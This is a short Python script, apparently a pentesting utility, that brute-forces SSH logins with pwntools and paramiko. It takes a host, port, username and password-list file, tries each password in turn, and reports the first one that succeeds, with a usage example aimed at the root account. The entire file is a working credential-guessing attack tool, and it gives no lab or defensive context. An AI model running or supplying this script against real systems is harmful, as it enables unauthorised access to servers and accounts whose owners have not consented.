from pwn import *
from paramiko import ssh_exception
import sys

FAIL = -1
SUCCESS = 0

def open_passwords(passwords):
    with open(passwords, "r") as passwords:
        for password in passwords:
            password = password.strip()
            yield password

def ssh_login(host, port, username, password):
    try:
        connection = ssh(
            host=host,
            port=port,
            user=username,
            password=password)
        return connection.connected()
    except ssh_exception.AuthenticationException:
        return False

if __name__ == "__main__":
    try:
        host = sys.argv[1].strip()
        port = int(sys.argv[2].strip())
        username = sys.argv[3].strip()
        passwords = sys.argv[4].strip()

        for password in open_passwords(passwords):
            print("[*] Trying password: %s" % password)
            if ssh_login(host, port, username, password):
                print("[+] Password found: %s" % password)
                sys.exit(SUCCESS)
            else:
                print("[-] Password not found")

    except IndexError:
        print("[-] Usage: %s <host> <port> <username> <password file>" % sys.argv[0])
        print('[-] Example: %s 192.168.10.5 22 root passwords.txt' % sys.argv[0]) 
        sys.exit(FAIL)
    except Exception as exception:
        print("[-] An exception occured %s" % exception)
        print("[-] The SSH attack was not successful.")
        sys.exit(FAIL)     